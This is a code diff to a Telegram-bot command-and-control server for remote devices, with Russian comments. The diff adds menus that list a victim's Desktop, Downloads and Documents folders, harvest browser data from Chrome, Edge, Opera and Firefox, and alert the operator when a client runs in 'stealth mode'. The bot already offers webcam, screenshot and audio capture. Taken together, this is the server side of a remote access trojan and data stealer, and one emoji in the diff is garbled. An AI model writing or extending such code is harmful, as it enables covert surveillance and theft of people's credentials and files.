@@ -273,7 +273,10 @@ class ServerBot:
                 [InlineKeyboardButton("📷 Мультимедиа", callback_data=f"action_{device_id}_media_menu")],
                 [InlineKeyboardButton("💻 Управление", callback_data=f"action_{device_id}_control_menu")],
                 [InlineKeyboardButton("⚙️ Система", callback_data=f"action_{device_id}_system_menu")],
-                [InlineKeyboardButton("🔙 Назад", callback_data="back_to_devices")]
+                [
+                    InlineKeyboardButton("🔙 Назад", callback_data="back_to_devices"),
+                    InlineKeyboardButton("🏠 Главное", callback_data="back_to_devices")
+                ]
             ]
             
             await self.application.bot.send_message(
@@ -301,7 +304,10 @@ class ServerBot:
                 [InlineKeyboardButton("🔊 +10%", callback_data=f"action_{device_id}_volume_up_10")],
                 [InlineKeyboardButton("🔉 -10%", callback_data=f"action_{device_id}_volume_down_10")],
                 [InlineKeyboardButton("🔇 Mute", callback_data=f"action_{device_id}_volume_mute")],
-                [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                [
+                    InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}"),
+                    InlineKeyboardButton("🏠 Главное", callback_data="back_to_devices")
+                ]
             ]
             await self.application.bot.send_message(
                 chat_id=chat_id,
@@ -468,7 +474,10 @@ class ServerBot:
                 [InlineKeyboardButton("🚫 Блокировка сайта", callback_data=f"action_{device_id}_block_site")],
                 [InlineKeyboardButton("🚫 Блокировка приложения", callback_data=f"action_{device_id}_block_app")],
                 [InlineKeyboardButton("🎤 Длительная запись аудио", callback_data=f"action_{device_id}_audio_menu")],
-                [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                [
+                    InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}"),
+                    InlineKeyboardButton("🏠 Главное", callback_data="back_to_devices")
+                ]
             ]
             await self.application.bot.send_message(
                 chat_id=chat_id,
@@ -691,6 +700,7 @@ class ServerBot:
             await self.application.bot.send_message(
                 chat_id=chat_id,
                 text="Введите текст, который нужно вывести на экране устройства:")
+            
         elif action in ["screenshot", "webcam", "record_video_10", "record_audio_10", 
                        "mouse_click", "lock", "sleep", "shutdown", "reboot"]:
             with sqlite3.connect(DATABASE) as conn:
@@ -703,6 +713,53 @@ class ServerBot:
                     [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                 ])
             )
+
+        elif action == "files_menu":
+            keyboard = [
+                [InlineKeyboardButton("📁 Рабочий стол", callback_data=f"action_{device_id}_ls:desktop")],
+                [InlineKeyboardButton("📥 Загрузки", callback_data=f"action_{device_id}_ls:downloads")],
+                [InlineKeyboardButton("📄 Документы", callback_data=f"action_{device_id}_ls:documents")],
+                [InlineKeyboardButton("🌐 Браузеры", callback_data=f"action_{device_id}_browsers_menu")],
+                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+            ]
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Файловый менеджер:",
+                reply_markup=InlineKeyboardMarkup(keyboard))
+        elif action == "browsers_menu":
+            keyboard = [
+                [InlineKeyboardButton("Google Chrome", callback_data=f"action_{device_id}_browser:chrome")],
+                [InlineKeyboardButton("Microsoft Edge", callback_data=f"action_{device_id}_browser:edge")],
+                [InlineKeyboardButton("Opera", callback_data=f"action_{device_id}_browser:opera")],
+                [InlineKeyboardButton("Mozilla Firefox", callback_data=f"action_{device_id}_browser:firefox")],
+                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_files_menu")]
+            ]
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Выберите браузер для сбора данных:",
+                reply_markup=InlineKeyboardMarkup(keyboard))
+        elif action.startswith("ls:"):
+            path = action.split(":", 1)[1]
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                        (device_id, f"ls:{path}"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text=f"Запрос содержимого {path} отправлен устройству. Ожидайте...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_files_menu")]
+                ]))
+        elif action.startswith("browser:"):
+            browser = action.split(":", 1)[1]
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                        (device_id, f"browser:{browser}"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text=f"Запрос данных браузера {browser} отправлен устройству. Ожидайте...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_browsers_menu")]
+                ]))
 
     def run(self):
         self.application.run_polling()
@@ -724,9 +781,10 @@ async def register_device(request: Request):
                     data['system_info']['ip'], data['system_info']['os']))
     if is_new and bot_instance:
         try:
+            stealth_note = "\n⚠️ Клиент работает в скрытом режиме" if data.get("stealth") else ""
             await bot_instance.application.bot.send_message(
                 chat_id=ADMIN_IDS[0],
-                text=f"🆕 Новое устройство зарегистрировано:\nID: {device_id}\nИмя: {data['system_info']['name']}\nIP: {data['system_info']['ip']}\nOS: {data['system_info']['os']}"
+                text=f"🆕 Новое устройство зарегистрировано:\nID: {device_id}\nИмя: {data['system_info']['name']}\nIP: {data['system_info']['ip']}\nOS: {data['system_info']['os']}{stealth_note}"
             )
         except Exception as e:
             logger.error(f"Ошибка отправки уведомления о новом устройстве: {e}")
@@ -815,7 +873,7 @@ async def command_result(request: Request):
                 row = [
                     InlineKeyboardButton(f"🗔 {title}", callback_data=f"noop") ,
                     InlineKeyboardButton("🔽", callback_data=f"action_{device_id}_window_action_{hwnd}_minimize"),
-                    InlineKeyboardButton("🔼", callback_data=f"action_{device_id}_window_action_{hwnd}_restore"),
+                    InlineKeyboardButton("��", callback_data=f"action_{device_id}_window_action_{hwnd}_restore"),
                     InlineKeyboardButton("❌", callback_data=f"action_{device_id}_window_action_{hwnd}_close")
                 ]
                 keyboard.append(row)
